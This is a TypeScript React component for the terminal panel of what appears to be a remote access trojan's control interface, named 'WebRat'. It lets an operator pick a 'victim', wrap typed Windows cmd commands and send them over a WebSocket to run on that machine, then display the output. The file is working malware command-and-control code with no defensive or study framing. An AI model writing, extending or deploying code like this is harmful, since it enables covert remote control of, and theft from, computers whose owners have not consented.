"use client";

import { useEffect } from "react";

import { usePanelDetailView } from "../panel-detail-view-provider";
import { usePanelWS } from "../../../ws/ws-provider";
import { showToast } from "../../../toast";

export function TerminalSection() {
  const detail = usePanelDetailView();
  const ws = usePanelWS();

  useEffect(() => {
    const consoleEl = document.getElementById("terminalConsole");
    const inputEl = document.getElementById("terminalCommandInput") as HTMLInputElement | null;
    const sendBtn = document.getElementById("terminalSendBtn") as HTMLButtonElement | null;
    if (!consoleEl || !inputEl || !sendBtn) return;

    let terminalUser = "user";
    let terminalCwd = "";

    const getPromptPrefix = () => {
      let userName = terminalUser || "user";
      terminalUser = userName;
      const defaultCwd = `C:\\Users\\${userName}`;
      if (!terminalCwd) terminalCwd = defaultCwd;
      return `${terminalCwd}>`;
    };

    const appendLine = (prefix: string, text: string) => {
      const line = document.createElement("div");
      const prefSpan = document.createElement("span");
      prefSpan.className = "terminal-line-prefix";
      prefSpan.textContent = prefix + " ";
      const textSpan = document.createElement("span");
      textSpan.className = "terminal-line-text";
      textSpan.textContent = text;
      line.appendChild(prefSpan);
      line.appendChild(textSpan);
      consoleEl.appendChild(line);
      consoleEl.scrollTop = consoleEl.scrollHeight;
    };

    (window as any).WebRatAppendTerminalOutput = (text: string) => {
      const lines = String(text || "").split(/\r?\n/);
      lines.forEach((ln) => {
        if (!ln) return;
        const raw = String(ln);
        const trimmed = raw.trim();
        if (trimmed.startsWith("__webrat_cwd__")) {
          const next = trimmed.slice("__webrat_cwd__".length).trim();
          if (next) terminalCwd = next;
          return;
        }
        const line = document.createElement("div");
        line.className = "terminal-line-output";
        line.textContent = raw;
        consoleEl.appendChild(line);
      });
      appendLine(getPromptPrefix(), "");
    };

    (window as any).WebRatEnsureTerminalPrompt = () => {
      if (!consoleEl.hasChildNodes()) {
        appendLine(getPromptPrefix(), "");
      }
    };

    const sendCommand = () => {
      const raw = String(inputEl.value || "").trim();
      if (!raw) return;

      if (raw.toLowerCase() === "cls") {
        consoleEl.innerHTML = "";
        appendLine(getPromptPrefix(), "");
        inputEl.value = "";
        return;
      }

      if (ws.state !== "open") {
        showToast("error", "WebSocket is not connected");
        return;
      }

      const victimId = detail.selectedVictimId;
      if (!victimId) {
        showToast("error", "Select victim first");
        return;
      }

      const cwd = terminalCwd || getPromptPrefix().replace(/>\s*$/, "");
      const safeCwd = String(cwd).replace(/"/g, "");
      const wrappedCmd = `chcp 65001>nul & cd /d "${safeCwd}" & ${raw} & echo __webrat_cwd__%CD%`;

      const ok = ws.sendJson({
        type: "command",
        victim_id: String(victimId),
        command: "cmd:" + wrappedCmd,
      });
      if (!ok) {
        showToast("error", "Failed to send command");
        return;
      }

      appendLine(getPromptPrefix(), raw);
      inputEl.value = "";
    };

    const onBtn = () => sendCommand();
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Enter") {
        e.preventDefault();
        sendCommand();
      }
    };

    sendBtn.addEventListener("click", onBtn);
    inputEl.addEventListener("keydown", onKey);

    try {
      (window as any).WebRatEnsureTerminalPrompt();
    } catch {
    }

    return () => {
      sendBtn.removeEventListener("click", onBtn);
      inputEl.removeEventListener("keydown", onKey);
    };
  }, [detail.selectedVictimId, ws]);

  return (
    <div className="detail-section h-full">
      <div className="relative flex h-full min-h-0 w-full flex-col overflow-hidden rounded-[18px] border border-white/15 bg-black/90 shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
        <div
          id="terminalConsole"
          className="min-h-0 flex-1 overflow-y-auto bg-transparent px-[14px] pb-[12px] pt-[10px] font-mono text-[13px] leading-[1.45] text-white/95"
          aria-label="Terminal output"
          role="log"
        />

        <div className="grid grid-cols-[1fr_max-content] items-center gap-[14px] border-t border-white/10 bg-[linear-gradient(180deg,rgba(18,18,18,0.98),rgba(10,10,10,0.98))] p-[10px_12px]">
          <input
            id="terminalCommandInput"
            className="w-full rounded-full border border-white/20 bg-[rgba(12,12,12,0.9)] px-[14px] py-[7px] text-[14px] text-white outline-none placeholder:text-white/60 focus:border-[var(--line)] focus:bg-[rgba(18,18,18,0.95)]"
            type="text"
            autoComplete="off"
            placeholder="command"
          />
          <button
            id="terminalSendBtn"
            className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
            style={{ borderBottom: "4px solid var(--line)" }}
            type="button"
          >
            Send
          </button>
        </div>
      </div>
    </div>
  );
}
